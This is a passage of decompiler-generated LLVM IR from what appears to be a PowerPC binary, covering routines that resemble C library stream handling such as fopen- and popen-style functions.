  br i1 %v3_10004f3c, label %dec_label_pc_10004f6c, label %dec_label_pc_10004f4c

dec_label_pc_10004f4c:                            ; preds = %dec_label_pc_10004f3c
  %v0_10004f4c = call i32 @function_10004b48()
  %v2_10004f5c = inttoptr i32 %v0_10004f4c to i32*
  store i32 22, i32* %v2_10004f5c, align 4
  br label %dec_label_pc_1000512c

dec_label_pc_10004f64:                            ; preds = %dec_label_pc_10004f18
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10004f6c

dec_label_pc_10004f6c:                            ; preds = %dec_label_pc_10004f3c, %dec_label_pc_10004f64
  %v0_10005034 = phi i32 [ 0, %dec_label_pc_10004f64 ], [ 1, %dec_label_pc_10004f3c ]
  store i32 ptrtoint ([3 x i8]* @global_var_10004f74.203 to i32), i32* @lr, align 4
  %v1_10004f70 = call i32 @function_10007cec(i32 12)
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 %v1_10004f70, i32* %r9.global-to-local, align 4
  %v3_10004f78 = icmp eq i32 %v1_10004f70, 0
  br i1 %v3_10004f78, label %dec_label_pc_1000512c, label %dec_label_pc_10004f88

dec_label_pc_10004f88:                            ; preds = %dec_label_pc_10004f6c
  %v2_10004f88 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10004f88, i32* %r29.global-to-local, align 4
  store i32 268455828, i32* @lr, align 4
  %v2_10004f90 = call i32 @function_100093cc(i32 %v2_10004f88, i32 %v1_10004f70)
  %v3_10004f94 = icmp eq i32 %v2_10004f90, 0
  br i1 %v3_10004f94, label %dec_label_pc_10004f9c, label %dec_label_pc_1000511c

dec_label_pc_10004f9c:                            ; preds = %dec_label_pc_10004f88
  store i32 %v0_10005034, i32* %r9.global-to-local, align 4
  %v0_10004fa0 = load i32, i32* @r31, align 4
  %tmp = sub nsw i32 0, %v0_10005034
  %v1_10004fa4 = and i32 %tmp, 4
  %v1_10004fa8 = xor i32 %v1_10004fa4, 4
  %v0_10004fac = load i32, i32* %r29.global-to-local, align 4
  %v2_10004fac = add i32 %v0_10004fac, %v1_10004fa8
  %v3_10004fac = inttoptr i32 %v2_10004fac to i32*
  %v4_10004fac = load i32, i32* %v3_10004fac, align 4
  %v2_10004fb8 = add i32 %v0_10004fac, %v1_10004fa4
  %v3_10004fb8 = inttoptr i32 %v2_10004fb8 to i32*
  %v4_10004fb8 = load i32, i32* %v3_10004fb8, align 4
  store i32 268455880, i32* @lr, align 4
  %v4_10004fc4 = call i32 @function_10009690(i32 %v4_10004fac, i32 %v0_10004fa0, i32 %v0_10005034)
  %v3_10004fc8 = icmp eq i32 %v4_10004fc4, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_10004fc8, label %dec_label_pc_10004fd4, label %dec_label_pc_10004fe8

dec_label_pc_10004fd4:                            ; preds = %dec_label_pc_10004f9c
  store i32 268455900, i32* @lr, align 4
  %v1_10004fd8 = call i32 @function_100048e0(i32 %v4_10004fac)
  store i32 ptrtoint (i32* @global_var_10004fe4.204 to i32), i32* @lr, align 4
  %v1_10004fe0 = call i32 @function_100048e0(i32 %v4_10004fb8)
  br label %dec_label_pc_1000511c

dec_label_pc_10004fe8:                            ; preds = %dec_label_pc_10004f9c
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100108fc.199 to i32), i32* %r29.global-to-local, align 4
  %v2_10004ffc = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_10004ffc, i32* @r3, align 4
  %v0_10005000 = call i32 @function_10008c80()
  %v0_10005008 = call i32 @function_10008c78()
  store i32 %v0_10005008, i32* @r3, align 4
  store i32 268455952, i32* @lr, align 4
  %v1_1000500c = call i32 @function_10008fd0(i32 %v0_10005008)
  store i32 %v1_1000500c, i32* @r31, align 4
  %v3_10005010 = icmp eq i32 %v1_1000500c, 0
  %v0_10005014 = call i32 @__asm_mfcr()
  store i32 %v0_10005014, i32* %r29.global-to-local, align 4
  br i1 %v3_10005010, label %dec_label_pc_1000501c, label %dec_label_pc_1000509c

dec_label_pc_1000501c:                            ; preds = %dec_label_pc_10004fe8
  store i32 268455972, i32* @lr, align 4
  %v1_10005020 = call i32 @function_100048e0(i32 %v4_10004fac)
  store i32 %v0_10005034, i32* %r9.global-to-local, align 4
  %v4_1000502c = icmp eq i32 %v4_10004fb8, %v0_10005034
  br i1 %v4_1000502c, label %dec_label_pc_10005048, label %dec_label_pc_10005034

dec_label_pc_10005034:                            ; preds = %dec_label_pc_1000501c
  store i32 268456000, i32* @lr, align 4
  %v2_1000503c = call i32 @function_1000914c(i32 %v4_10004fb8, i32 %v0_10005034)
  store i32 268456008, i32* @lr, align 4
  %v1_10005044 = call i32 @function_100048e0(i32 %v4_10004fb8)
  br label %dec_label_pc_10005048

dec_label_pc_10005048:                            ; preds = %dec_label_pc_1000501c, %dec_label_pc_10005034
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %storemerge1 = load i32, i32* @global_var_10010490.200, align 4
  store i32 %storemerge1, i32* %r29.global-to-local, align 4
  %v3_100050644 = icmp eq i32 %storemerge1, 0
  br i1 %v3_100050644, label %dec_label_pc_1000506c, label %dec_label_pc_10005054

dec_label_pc_10005054:                            ; preds = %dec_label_pc_10005048, %dec_label_pc_10005054
  %v0_10005054 = phi i32 [ %storemerge, %dec_label_pc_10005054 ], [ %storemerge1, %dec_label_pc_10005048 ]
  %v1_10005054 = add i32 %v0_10005054, 4
  %v2_10005054 = inttoptr i32 %v1_10005054 to i32*
  %v3_10005054 = load i32, i32* %v2_10005054, align 4
  store i32 %v3_10005054, i32* %r9.global-to-local, align 4
  %v1_10005058 = add i32 %v3_10005054, 4
  %v2_10005058 = inttoptr i32 %v1_10005058 to i32*
  %v3_10005058 = load i32, i32* %v2_10005058, align 4
  store i32 268456032, i32* @lr, align 4
  %v1_1000505c = call i32 @function_100048e0(i32 %v3_10005058)
  %v0_10005060 = load i32, i32* %r29.global-to-local, align 4
  %v1_10005060 = inttoptr i32 %v0_10005060 to i32*
  %storemerge = load i32, i32* %v1_10005060, align 4
  store i32 %storemerge, i32* %r29.global-to-local, align 4
  %v3_10005064 = icmp eq i32 %storemerge, 0
  br i1 %v3_10005064, label %dec_label_pc_1000506c, label %dec_label_pc_10005054

dec_label_pc_1000506c:                            ; preds = %dec_label_pc_10005054, %dec_label_pc_10005048
  %v8_10005090 = call i32 @function_100088dc(i32 ptrtoint ([8 x i8]* @global_var_1000e030.207 to i32), i32 ptrtoint ([3 x i8]* @global_var_1000e038.208 to i32), i32 ptrtoint ([3 x i8]* @global_var_1000e03c.209 to i32), i32 %arg1, i32 0)
  %v1_10005098 = call i32 @function_10009110(i32 127)
  br label %dec_label_pc_1000509c

dec_label_pc_1000509c:                            ; preds = %dec_label_pc_10004fe8, %dec_label_pc_1000506c
  store i32 %v2_10004ffc, i32* @r3, align 4
  %v0_100050a8 = call i32 @function_10008c80()
  store i32 268456116, i32* @lr, align 4
  %v1_100050b0 = call i32 @function_100048e0(i32 %v4_10004fb8)
  %v0_100050b4 = load i32, i32* %r29.global-to-local, align 4
  %v1_100050b4 = call %0 @__asm_mtcrf(i32 128, i32 %v0_100050b4)
  %v2_100050b4 = extractvalue %0 %v1_100050b4, 0
  %v4_100050b4 = extractvalue %0 %v1_100050b4, 2
  %v2_100050b8 = or i1 %v4_100050b4, %v2_100050b4
  br i1 %v2_100050b8, label %dec_label_pc_10005114, label %dec_label_pc_100050bc

dec_label_pc_100050bc:                            ; preds = %dec_label_pc_1000509c
  store i32 %v1_10004f70, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100108fc.199 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10004ffc, i32* @r3, align 4
  %v0_100050d0 = load i32, i32* @r31, align 4
  %v2_100050d0 = add i32 %v1_10004f70, 8
  %v3_100050d0 = inttoptr i32 %v2_100050d0 to i32*
  store i32 %v0_100050d0, i32* %v3_100050d0, align 4
  store i32 %v4_10004fc4, i32* %r11.global-to-local, align 4
  %v1_100050d8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100050d8 = add i32 %v1_100050d8, 4
  %v3_100050d8 = inttoptr i32 %v2_100050d8 to i32*
  store i32 %v4_10004fc4, i32* %v3_100050d8, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v0_100050e4 = call i32 @function_10008c80()
  %v0_100050ec = call i32 @function_10008c78()
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_100050f4 = load i32, i32* @global_var_10010490.200, align 4
  store i32 %v2_10004ffc, i32* @r3, align 4
  store i32 %v1_10004f70, i32* %r11.global-to-local, align 4
  %v2_10005104 = inttoptr i32 %v1_10004f70 to i32*
  store i32 %v3_100050f4, i32* %v2_10005104, align 4
  %v0_10005108 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10005108, i32* @global_var_10010490.200, align 4
  %v0_1000510c = call i32 @function_10008c80()
  br label %dec_label_pc_1000512c

dec_label_pc_10005114:                            ; preds = %dec_label_pc_1000509c
  store i32 268456220, i32* @lr, align 4
  %v1_10005118 = inttoptr i32 %v4_10004fc4 to i16*
  %v2_10005118 = call i32 @function_10004b54(i16* %v1_10005118)
  br label %dec_label_pc_1000511c

dec_label_pc_1000511c:                            ; preds = %dec_label_pc_10004f88, %dec_label_pc_10004fd4, %dec_label_pc_10005114
  store i32 ptrtoint (i32* @global_var_10005124.212 to i32), i32* @lr, align 4
  %v1_10005120 = call i32 @function_10007e44(i32 %v1_10004f70)
  br label %dec_label_pc_1000512c

dec_label_pc_1000512c:                            ; preds = %dec_label_pc_10004f6c, %dec_label_pc_100050bc, %dec_label_pc_10004f4c, %dec_label_pc_1000511c
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_10004f6c ], [ 0, %dec_label_pc_1000511c ], [ %v4_10004fc4, %dec_label_pc_100050bc ], [ 0, %dec_label_pc_10004f4c ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v4_10004fc4, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_10004fb8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_10004f70, { 4, 1, 0, 3, 2, 5, 6, 7 }
  uselistorder i32 %v0_10005034, { 1, 3, 2, 5, 0, 4 }
  uselistorder i32* %r29.global-to-local, { 0, 2, 1, 7, 8, 3, 4, 5, 6 }
  uselistorder i32* @global_var_10010490.200, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000512c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000511c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000509c, { 1, 0 }
  uselistorder label %dec_label_pc_10005054, { 1, 0 }
  uselistorder label %dec_label_pc_10005048, { 1, 0 }
  uselistorder label %dec_label_pc_10004f6c, { 1, 0 }
}

define i32 @function_10005144(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_10005144:
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10005148 = load i32, i32* @lr, align 4
  store i32 %v0_10005148, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_10005158 = load i32, i32* @r5, align 4
  store i32 %v0_10005158, i32* @r31, align 4
  %v0_1000515c = load i32, i32* @r6, align 4
  store i32 %v0_1000515c, i32* @r29, align 4
  %v3_10005160 = load i8, i8* %arg2, align 1
  %v4_10005160 = zext i8 %v3_10005160 to i32
  store i32 %v4_10005160, i32* %r0.global-to-local, align 4
  %v3_10005164 = icmp eq i8 %v3_10005160, 114
  br i1 %v3_10005164, label %dec_label_pc_100051b0, label %dec_label_pc_1000516c

dec_label_pc_1000516c:                            ; preds = %dec_label_pc_10005144
  %v3_1000516c = icmp eq i8 %v3_10005160, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_1000516c, label %dec_label_pc_100051b4, label %dec_label_pc_10005178

dec_label_pc_10005178:                            ; preds = %dec_label_pc_1000516c
  %v3_10005178 = icmp eq i8 %v3_10005160, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_10005178, label %dec_label_pc_100051b4, label %dec_label_pc_10005184

dec_label_pc_10005184:                            ; preds = %dec_label_pc_10005244, %dec_label_pc_10005214, %dec_label_pc_10005178
  %v0_10005184 = call i32 @function_10004b48()
  store i32 22, i32* %r0.global-to-local, align 4
  %v0_1000518c = load i32, i32* @r31, align 4
  %v3_1000518c = icmp eq i32 %v0_1000518c, 0
  %v2_10005190 = inttoptr i32 %v0_10005184 to i32*
  store i32 22, i32* %v2_10005190, align 4
  br i1 %v3_1000518c, label %dec_label_pc_100053e8, label %dec_label_pc_10005198

dec_label_pc_10005198:                            ; preds = %dec_label_pc_10005278, %dec_label_pc_10005184
  %v0_10005198 = load i32, i32* @r31, align 4
  %v1_10005198 = inttoptr i32 %v0_10005198 to i16*
  %v2_10005198 = load i16, i16* %v1_10005198, align 2
  %v3_10005198 = zext i16 %v2_10005198 to i32
  store i32 %v3_10005198, i32* %r0.global-to-local, align 4
  %v1_1000519c = and i32 %v3_10005198, 8192
  store i32 %v1_1000519c, i32* %r9.global-to-local, align 4
  %v3_1000519c = icmp eq i32 %v1_1000519c, 0
  br i1 %v3_1000519c, label %dec_label_pc_100053e8, label %dec_label_pc_100051a4

dec_label_pc_100051a4:                            ; preds = %dec_label_pc_10005198
  store i32 ptrtoint (i32* @global_var_100051ac.214 to i32), i32* @lr, align 4
  %v2_100051a8 = call i32 @function_10007e44(i32 %v0_10005198)
  br label %dec_label_pc_100053e8

dec_label_pc_100051b0:                            ; preds = %dec_label_pc_10005144
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_100051b4

dec_label_pc_100051b4:                            ; preds = %dec_label_pc_10005178, %dec_label_pc_1000516c, %dec_label_pc_100051b0
  %v0_100051d4 = phi i32 [ 1089, %dec_label_pc_10005178 ], [ 577, %dec_label_pc_1000516c ], [ 1, %dec_label_pc_100051b0 ]
  %v2_100051b4 = add i32 %tmp, 1
  %v3_100051b4 = inttoptr i32 %v2_100051b4 to i8*
  %v4_100051b4 = load i8, i8* %v3_100051b4, align 1
  %v5_100051b4 = zext i8 %v4_100051b4 to i32
  store i32 %v5_100051b4, i32* %r0.global-to-local, align 4
  %v3_100051bc = icmp eq i8 %v4_100051b4, 98
  br i1 %v3_100051bc, label %dec_label_pc_100051c8, label %dec_label_pc_100051c4

dec_label_pc_100051c4:                            ; preds = %dec_label_pc_100051b4
  br label %dec_label_pc_100051c8

dec_label_pc_100051c8:                            ; preds = %dec_label_pc_100051b4, %dec_label_pc_100051c4
  %storemerge = phi i32 [ %tmp, %dec_label_pc_100051c4 ], [ %v2_100051b4, %dec_label_pc_100051b4 ]
  %v0_100051c8 = phi i32 [ %tmp, %dec_label_pc_100051c4 ], [ %v2_100051b4, %dec_label_pc_100051b4 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_100051c8 = add i32 %v0_100051c8, 1
  %v2_100051c8 = inttoptr i32 %v1_100051c8 to i8*
  %v3_100051c8 = load i8, i8* %v2_100051c8, align 1
  %v4_100051c8 = zext i8 %v3_100051c8 to i32
  store i32 %v4_100051c8, i32* %r0.global-to-local, align 4
  %v3_100051cc = icmp eq i8 %v3_100051c8, 43
  br i1 %v3_100051cc, label %dec_label_pc_100051d4, label %dec_label_pc_100051dc

dec_label_pc_100051d4:                            ; preds = %dec_label_pc_100051c8
  store i32 %v0_100051d4, i32* %r9.global-to-local, align 4
  %v1_100051d8 = add nuw nsw i32 %v0_100051d4, 1
  store i32 %v1_100051d8, i32* @r28, align 4
  br label %dec_label_pc_100051dc

dec_label_pc_100051dc:                            ; preds = %dec_label_pc_100051c8, %dec_label_pc_100051d4
  %v3_100051dc = icmp eq i32 %v0_10005158, 0
  br i1 %v3_100051dc, label %dec_label_pc_100051e4, label %dec_label_pc_1000520c

dec_label_pc_100051e4:                            ; preds = %dec_label_pc_100051dc
  store i32 268456428, i32* @lr, align 4
  %v1_100051e8 = call i32 @function_10007cec(i32 80)
  store i32 %v1_100051e8, i32* @r31, align 4
  %v4_100051ec = icmp eq i32 %v1_100051e8, 0
  br i1 %v4_100051ec, label %dec_label_pc_100053ec, label %dec_label_pc_100051f4

dec_label_pc_100051f4:                            ; preds = %dec_label_pc_100051e4
  %v1_100051f8 = add i32 %v1_100051e8, 56
  store i32 %v1_100051f8, i32* @r3, align 4
  %v3_100051fc = inttoptr i32 %v1_100051e8 to i16*
  store i16 8192, i16* %v3_100051fc, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10005204 = load i32, i32* @r31, align 4
  %v2_10005204 = add i32 %v1_10005204, 8
  %v3_10005204 = inttoptr i32 %v2_10005204 to i32*
  store i32 0, i32* %v3_10005204, align 4
  store i32 268456460, i32* @lr, align 4
  %v0_10005208 = call i32 @function_10005478()
  %v0_1000520c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000520c

dec_label_pc_1000520c:                            ; preds = %dec_label_pc_100051dc, %dec_label_pc_100051f4
  %v0_1000526c = phi i32 [ %v0_1000515c, %dec_label_pc_100051dc ], [ %v0_1000520c.pre, %dec_label_pc_100051f4 ]
  %v1_1000520c = icmp slt i32 %v0_1000526c, 0
  br i1 %v1_1000520c, label %dec_label_pc_1000526c, label %dec_label_pc_10005214

dec_label_pc_10005214:                            ; preds = %dec_label_pc_1000520c
  %v1_10005218 = add i32 %arg1, 1
  store i32 %v1_10005218, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_10005220 = load i32, i32* @r31, align 4
  %v2_10005220 = add i32 %v1_10005220, 4
  %v3_10005220 = inttoptr i32 %v2_10005220 to i32*
  store i32 %v0_1000526c, i32* %v3_10005220, align 4
  %v0_10005224 = load i32, i32* @r28, align 4
  %v1_10005224 = load i32, i32* %r9.global-to-local, align 4
  %v2_10005224 = and i32 %v1_10005224, %v0_10005224
  %v1_10005228 = add i32 %v2_10005224, 1
  store i32 %v1_10005228, i32* %r9.global-to-local, align 4
  %v1_1000522c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000522c = and i32 %v1_1000522c, %v1_10005228
  store i32 %v2_1000522c, i32* %r0.global-to-local, align 4
  %v4_10005230 = icmp eq i32 %v2_1000522c, %v1_10005228
  br i1 %v4_10005230, label %dec_label_pc_10005238, label %dec_label_pc_10005184

dec_label_pc_10005238:                            ; preds = %dec_label_pc_10005214
  %v2_10005238 = sub i32 -1, %arg1
  %v3_10005238 = and i32 %v0_10005224, %v2_10005238
  store i32 %v3_10005238, i32* %r0.global-to-local, align 4
  %v1_1000523c = and i32 %v3_10005238, 1024
  store i32 %v1_1000523c, i32* %r9.global-to-local, align 4
  %v3_1000523c = icmp eq i32 %v1_1000523c, 0
  br i1 %v3_1000523c, label %dec_label_pc_10005260, label %dec_label_pc_10005244

dec_label_pc_10005244:                            ; preds = %dec_label_pc_10005238
  %v0_10005244 = load i32, i32* @r29, align 4
  store i32 268456536, i32* @lr, align 4
  %v2_10005254 = call i32 @function_10009028(i32 %v0_10005244, i32 4)
  %v3_10005258 = icmp eq i32 %v2_10005254, 0
  br i1 %v3_10005258, label %dec_label_pc_10005260, label %dec_label_pc_10005184

dec_label_pc_10005260:                            ; preds = %dec_label_pc_10005244, %dec_label_pc_10005238
  %v1_10005260 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_10005260, i32* %r0.global-to-local, align 4
  %v0_10005264 = load i32, i32* @r28, align 4
  %v2_10005264 = or i32 %v0_10005264, %v1_10005260
  store i32 %v2_10005264, i32* @r28, align 4
  br label %dec_label_pc_10005298

dec_label_pc_1000526c:                            ; preds = %dec_label_pc_1000520c
  %v3_1000526c = icmp eq i32 %v0_1000526c, -1
  %v0_1000527c.pre = load i32, i32* @r28, align 4
  br i1 %v3_1000526c, label %dec_label_pc_10005278, label %dec_label_pc_10005274

dec_label_pc_10005274:                            ; preds = %dec_label_pc_1000526c
  %v1_10005274 = or i32 %v0_1000527c.pre, 65536
  store i32 %v1_10005274, i32* @r28, align 4
  br label %dec_label_pc_10005278

dec_label_pc_10005278:                            ; preds = %dec_label_pc_1000526c, %dec_label_pc_10005274
  %v0_1000527c = phi i32 [ %v1_10005274, %dec_label_pc_10005274 ], [ %v0_1000527c.pre, %dec_label_pc_1000526c ]
  store i32 438, i32* @r5, align 4
  store i32 268456588, i32* @lr, align 4
  %v2_10005288 = call i32 @function_10009344(i32 %arg1, i32 %v0_1000527c)
  %v1_1000528c = icmp slt i32 %v2_10005288, 0
  %v1_10005290 = load i32, i32* @r31, align 4
  %v2_10005290 = add i32 %v1_10005290, 4
  %v3_10005290 = inttoptr i32 %v2_10005290 to i32*
  store i32 %v2_10005288, i32* %v3_10005290, align 4
  br i1 %v1_1000528c, label %dec_label_pc_10005198, label %dec_label_pc_10005278.dec_label_pc_10005298_crit_edge

dec_label_pc_10005278.dec_label_pc_10005298_crit_edge: ; preds = %dec_label_pc_10005278
  %v0_1000529c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10005298

dec_label_pc_10005298:                            ; preds = %dec_label_pc_10005278.dec_label_pc_10005298_crit_edge, %dec_label_pc_10005260
  %v0_1000529c = phi i32 [ %v0_1000529c.pre, %dec_label_pc_10005278.dec_label_pc_10005298_crit_edge ], [ %v2_10005264, %dec_label_pc_10005260 ]
  %v0_10005298 = load i32, i32* @r31, align 4
  %v1_10005298 = inttoptr i32 %v0_10005298 to i16*
  %v2_10005298 = load i16, i16* %v1_10005298, align 2
  %v3_10005298 = zext i16 %v2_10005298 to i32
  store i32 %v3_10005298, i32* %r0.global-to-local, align 4
  %v1_1000529c = urem i32 %v0_1000529c, 4
  store i32 %v1_1000529c, i32* %r29.global-to-local, align 4
  %v1_100052a0 = call i32 @__asm_rlwinm(i32 %v0_1000529c, i32 0, i32 21, i32 21)
  %v1_100052a4 = add nuw nsw i32 %v1_1000529c, 1
  %v1_100052a8 = xor i32 %v1_100052a4, 3
  store i32 %v1_100052a8, i32* %r29.global-to-local, align 4
  %v1_100052ac = call i32 @__asm_rlwinm(i32 %v3_10005298, i32 0, i32 18, i32 18)
  %v2_100052ac = trunc i32 %v1_100052ac to i16
  store i32 %v1_100052ac, i32* %r0.global-to-local, align 4
  %v1_100052b0 = mul nuw nsw i32 %v1_100052a8, 16
  store i32 %v1_100052b0, i32* %r29.global-to-local, align 4
  %v3_100052b4 = load i32, i32* @r31, align 4
  %v4_100052b4 = inttoptr i32 %v3_100052b4 to i16*
  store i16 %v2_100052ac, i16* %v4_100052b4, align 2
  %v0_100052b8 = load i32, i32* @r28, align 4
  %v1_100052b8 = call i32 @__asm_rlwinm(i32 %v0_100052b8, i32 31, i32 16, i32 16)
  %v2_100052bc = or i32 %v1_100052b8, %v1_100052a0
  store i32 %v2_100052bc, i32* %r0.global-to-local, align 4
  %v0_100052c0 = load i32, i32* @r31, align 4
  %v1_100052c0 = inttoptr i32 %v0_100052c0 to i16*
  %v2_100052c0 = load i16, i16* %v1_100052c0, align 2
  %v3_100052c0 = zext i16 %v2_100052c0 to i32
  %v2_100052c4 = or i32 %v3_100052c0, %v2_100052bc
  store i32 %v2_100052c4, i32* %r9.global-to-local, align 4
  %v0_100052c8 = load i32, i32* %r29.global-to-local, align 4
  %v2_100052c8 = or i32 %v2_100052c4, %v0_100052c8
  store i32 %v2_100052c8, i32* @r29, align 4
  %v1_100052cc = trunc i32 %v2_100052c8 to i16
  store i16 %v1_100052cc, i16* %v1_100052c0, align 2
  %v0_100052d0 = call i32 @function_10004b48()
  store i32 %v0_100052d0, i32* @r28, align 4
  %v0_100052d8 = load i32, i32* @r31, align 4
  %v1_100052d8 = add i32 %v0_100052d8, 4
  %v2_100052d8 = inttoptr i32 %v1_100052d8 to i32*
  %v3_100052d8 = load i32, i32* %v2_100052d8, align 4
  %v1_100052dc = inttoptr i32 %v0_100052d0 to i32*
  %v2_100052dc = load i32, i32* %v1_100052dc, align 4
  store i32 %v2_100052dc, i32* @r27, align 4
  store i32 268456676, i32* @lr, align 4
  %v1_100052e0 = call i32 @function_10007408(i32 %v3_100052d8)
  %v1_100052e4 = mul i32 %v1_100052e0, 256
  %v0_100052e8 = load i32, i32* @r29, align 4
  %v2_100052e8 = or i32 %v0_100052e8, %v1_100052e4
  store i32 %v2_100052e8, i32* @r29, align 4
  %v1_100052ec = trunc i32 %v2_100052e8 to i16
  %v2_100052ec = load i32, i32* @r31, align 4
  %v3_100052ec = inttoptr i32 %v2_100052ec to i16*
  store i16 %v1_100052ec, i16* %v3_100052ec, align 2
  %v0_100052f0 = load i32, i32* @r27, align 4
  %v1_100052f0 = load i32, i32* @r28, align 4
  %v2_100052f0 = inttoptr i32 %v1_100052f0 to i32*
  store i32 %v0_100052f0, i32* %v2_100052f0, align 4
  %v0_100052f4 = load i32, i32* @r31, align 4
  %v1_100052f4 = add i32 %v0_100052f4, 8
  %v2_100052f4 = inttoptr i32 %v1_100052f4 to i32*
  %v3_100052f4 = load i32, i32* %v2_100052f4, align 4
  store i32 %v3_100052f4, i32* %r0.global-to-local, align 4
  %v3_100052f8 = icmp eq i32 %v3_100052f4, 0
  br i1 %v3_100052f8, label %dec_label_pc_10005300, label %dec_label_pc_10005330

dec_label_pc_10005300:                            ; preds = %dec_label_pc_10005298
  store i32 268456712, i32* @lr, align 4
  %v1_10005304 = call i32 @function_10007cec(i32 4096)
  %v3_10005308 = icmp eq i32 %v1_10005304, 0
  %v1_1000530c = load i32, i32* @r31, align 4
  %v2_1000530c = add i32 %v1_1000530c, 8
  %v3_1000530c = inttoptr i32 %v2_1000530c to i32*
  store i32 %v1_10005304, i32* %v3_1000530c, align 4
  %v1_1000532c = load i32, i32* @r31, align 4
  br i1 %v3_10005308, label %dec_label_pc_1000532c, label %dec_label_pc_10005314

dec_label_pc_10005314:                            ; preds = %dec_label_pc_10005300
  %v1_10005314 = inttoptr i32 %v1_1000532c to i16*
  %v2_10005314 = load i16, i16* %v1_10005314, align 2
  %v3_10005314 = zext i16 %v2_10005314 to i32
  store i32 %v3_10005314, i32* %r0.global-to-local, align 4
  %v1_10005318 = add i32 %v1_10005304, 4096
  store i32 %v1_10005318, i32* %r9.global-to-local, align 4
  %v2_1000531c = add i32 %v1_1000532c, 12
  %v3_1000531c = inttoptr i32 %v2_1000531c to i32*
  store i32 %v1_10005318, i32* %v3_1000531c, align 4
  %v0_10005320 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005320 = or i32 %v0_10005320, 16384
  store i32 %v1_10005320, i32* %r0.global-to-local, align 4
  %v1_10005324 = trunc i32 %v1_10005320 to i16
  %v2_10005324 = load i32, i32* @r31, align 4
  %v3_10005324 = inttoptr i32 %v2_10005324 to i16*
  store i16 %v1_10005324, i16* %v3_10005324, align 2
  br label %dec_label_pc_10005330

dec_label_pc_1000532c:                            ; preds = %dec_label_pc_10005300
  %v2_1000532c = add i32 %v1_1000532c, 12
  %v3_1000532c = inttoptr i32 %v2_1000532c to i32*
  store i32 0, i32* %v3_1000532c, align 4
  br label %dec_label_pc_10005330

dec_label_pc_10005330:                            ; preds = %dec_label_pc_10005298, %dec_label_pc_10005314, %dec_label_pc_1000532c
  %v0_10005330 = load i32, i32* @r31, align 4
  %v1_10005330 = add i32 %v0_10005330, 8
  %v2_10005330 = inttoptr i32 %v1_10005330 to i32*
  %v3_10005330 = load i32, i32* %v2_10005330, align 4
  store i32 %v3_10005330, i32* %r9.global-to-local, align 4
  %v3_10005338 = add i32 %v0_10005330, 2
  %v4_10005338 = inttoptr i32 %v3_10005338 to i8*
  store i8 0, i8* %v4_10005338, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10005340 = load i32, i32* @r31, align 4
  %v2_10005340 = add i32 %v1_10005340, 44
  %v3_10005340 = inttoptr i32 %v2_10005340 to i32*
  store i32 0, i32* %v3_10005340, align 4
  %v0_10005344 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005344 = load i32, i32* @r31, align 4
  %v2_10005344 = add i32 %v1_10005344, 20
  %v3_10005344 = inttoptr i32 %v2_10005344 to i32*
  store i32 %v0_10005344, i32* %v3_10005344, align 4
  %v0_10005348 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005348 = load i32, i32* @r31, align 4
  %v2_10005348 = add i32 %v1_10005348, 24
  %v3_10005348 = inttoptr i32 %v2_10005348 to i32*
  store i32 %v0_10005348, i32* %v3_10005348, align 4
  %v0_1000534c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000534c = load i32, i32* @r31, align 4
  %v2_1000534c = add i32 %v1_1000534c, 28
  %v3_1000534c = inttoptr i32 %v2_1000534c to i32*
  store i32 %v0_1000534c, i32* %v3_1000534c, align 4
  %v0_10005350 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005350 = load i32, i32* @r31, align 4
  %v2_10005350 = add i32 %v1_10005350, 16
  %v3_10005350 = inttoptr i32 %v2_10005350 to i32*
  store i32 %v0_10005350, i32* %v3_10005350, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v0_10005358 = load i32, i32* @r31, align 4
  %v1_10005358 = inttoptr i32 %v0_10005358 to i16*
  %v2_10005358 = load i16, i16* %v1_10005358, align 2
  %v3_10005358 = zext i16 %v2_10005358 to i32
